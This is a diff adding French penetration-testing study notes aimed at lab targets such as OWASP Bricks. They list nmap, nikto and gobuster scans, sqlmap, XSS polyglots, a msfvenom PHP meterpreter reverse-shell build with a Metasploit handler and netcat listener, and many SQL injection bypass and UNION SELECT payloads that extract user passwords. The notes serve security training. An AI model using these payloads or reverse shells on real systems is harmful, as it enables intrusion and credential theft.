@@ -1,0 +1,186 @@
+Notes 
+
+I/ NMAP & Nikto command 
+
+Exemple : Nmap -sV ip 
+
+0. nmap -sP l'ip du réseau donc .0/24 Pour trouver les machines up sur le réseau
+
+1. `-sS` : Scan SYN (Scan de type SYN). Il s'agit d'un scan TCP rapide, également appelé scan de type half-open, qui tente d'établir une connexion TCP en utilisant le flag SYN.
+    
+2. `-sT` : Scan TCP Connect (Scan de type TCP Connect). Ce scan tente d'établir une connexion TCP complète avec la cible, simulant une connexion normale.
+    
+3. `-sU` : Scan UDP (Scan de type UDP). Il est utilisé pour scanner les ports UDP, qui sont souvent utilisés pour des services tels que DNS et SNMP.
+    
+4. `-sF` : Scan FIN (Scan de type FIN). Ce scan envoie un paquet TCP FIN pour voir comment le serveur réagit. Il est souvent utilisé pour détecter les pare-feu.
+    
+5. `-sX` : Scan Xmas (Scan de type Xmas). Il envoie des paquets avec les drapeaux FIN, URG et PUSH activés pour explorer la réponse du serveur.
+    
+6. `-sA` : Scan ACK (Scan de type ACK). Ce scan envoie des paquets ACK pour voir comment le pare-feu réagit et pour détecter les filtres d'État.
+    
+7. `-sV` : Détection de version. Cette option tente de déterminer les versions des services en cours d'exécution sur les ports ouverts.
+    
+8. `-O` : Détection du système d'exploitation. Elle tente de déterminer le système d'exploitation de la cible en analysant les réponses aux paquets. 
+
+9. `-p-` : C'est l'option qui indique à Nmap de scanner tous les ports TCP de la machine cible, de 1 à 65535.
+nmap -p- -T4 -A IP
+Pensez a scan TCP et UDP (tcp en prio puis UDP en background en avançant sur autre chose)
+--top-ports : meilleur ports
+
+Scan basique Nitko 
+
+nikto -host http://ip
+—----------------------------------------------------------------------------------------------------------------------------
+
+
+II/ Dirbuster
+gobuster dir -u <url> -w <wordlist.txt> 
+Exemple : 
+gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
+III/ SQL 
+SQLmap
+python3 sqlmap.py -u 'http://192.168.56.101/concerts.php?neighbourhood=Little+China' –dump
+SQL
+' or 1 --
+
+IV/ XSS
+Polyglot : 
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('Test') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('Test')//>\x3e
+
+Alert basique : 
+<script>alert('XSS')</script>
+<svg src=1 onerror='alert(1) />
+
+
+
+V/ Files Upload
+https://www.revshells.com/
+https://github.com/flozz/p0wny-shell
+
+Pour avoir un beau shell : python3 -c "import pty;pty.spawn ('/bin/bash')"
+
+
+https://www.pentesterlab.com/exercises/codereview/course
+
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#generating-reverse-shell-commands
+
+php/meterpreter/reverse_tcp
+php/meterpreter_reverse_tcp
+
+msfvenom -p php/meterpreter_reverse_tcp -f php -o mshell.php LHOST=10.0.2.15 LPORT=4444
+
+search proftpd
+
+use /exploit/multi/handler
+
+set payload php/meterpreter/reverse_tcp
+
+php -S localhost:8000
+
+
+
+
+
+
+
+reverse shell php
+-p
+
+format de sortie php ou raw
+
+
+
+
+
+noter les ports et identifiers les services
+
+
+
+
+Nessus ou OpenVAS
+
+https://www.exploit-db.com/
+metasploit
+
+Bloodhound
+
+
+Tests d’infrastructure :
+Scan de port
+Scanner de vulnérabilités
+Vérification des version, recherche de vulnérabilités
+Test d’exploit si applicable
+Recherche d’erreur de configuration
+Web :
+Énumération du contenu
+Scan de vulnérabilités
+Test approfondi des fonctionnalités web
+
+https://owasp.org/www-project-web-security-testing-guide/v42/
+
+
+
+Scan du réseau interne
+Scan de vulnérabilités (Nessus ou OpenVAS)
+Exploiter les vulnérabilités Critiques
+Utilisation de Bloodhound pour trouver un chemin d’accès
+Erreurs de configuration d’AD
+Réutilisation de mot de passe
+Si possible devenir administrateur de domaine
+
+
+
+
+
+https://www.hackthebox.com/blog/penetration-testing-reports-template-and-guide
+
+   
+username=test&passwd=test')or+1;#&submit=Submit
+username=test&passwd=test")or+1;#&submit=Submit
+username=test'or+1;# &passwd=test&submit=Submit
+
+
+
++ORDER+BY+8
++UNION+SELECT;%23    
+http://192.168.56.101/owaspbricks/content-1/index.php?id=0+UNION+SELECT+%22AAA%22,+%22B%22,+%22C%22,+NULL,+NULL,+NULL,+NULL,+NULL+LIMIT+1,1;%23
+http://192.168.56.101/owaspbricks/content-1/index.php?id=0+UNION+SELECT+password,+%22B%22,+%22C%22,+NULL,+NULL,+NULL,+NULL,+NULL+FROM+USERS+LIMIT+2,1;%23
++LIMIT+1,1;%23
+http://192.168.56.101/owaspbricks/content-2/index.php?user=harry%27+UNION+SELECT+password,+%22B%22,+%22C%22,+NULL,+NULL,+NULL,+NULL,+NULL+FROM+USERS+LIMIT+1,1;%23
+
+username=tom'+UNION+SELECT+@@version,NULL,NULL,NULL,NULL,NULL,NULL,NULL+LIMIT+1,1;%23&submit=Submit
+username=tom'+UNION+SELECT+@@version,NULL,group_concat(0x7c,schema_name,0x7c),null,NULL,NULL,NULL,NULL+FROM+information_schema.
+
+schemata+LIMIT+1,1;%23&submit=Submit
+
+username=tom'+UNION+SELECT+@@version,NULL,group_concat(0x7c,table_name,0x7c),null,NULL,NULL,NULL,NULL+FROM+information_schema.tables+
+
+WHERE+table_schema='bricks' +LIMIT+1,1;%23&submit=Submit
+
+username=tom'+UNION+SELECT+@@version,NULL,group_concat(0x7c,column_name,0x7c),null,NULL,NULL,NULL,NULL+FROM+information_schema.columns+
+
+WHERE+table_name='users'+AND+table_schema='bricks' +LIMIT+1,1;%23&submit=Submit
+
+User-Agent:user' UNION SELECT ua,null,null,null,null,null,null,null FROM users;#
+Rain_Browser
+Mantra
+Bricks_Browseer
+
+MyBVTklPTiBTRUxFQ1QgcGFzc3dvcmQsJ2EnLCdhJywnYScsJ2EnLCdhJywnYScsJ2EnIEZST00gdXNlcnMgTElNSVQgMSwxOyM=
+
+PayloadAllTheThings
+
+https://www.revshells.com/
+
+
+rlwrap nc -lvnp 1137
+
+
+
+
+
+
+
+curl http://ip/robots.txt
+
+
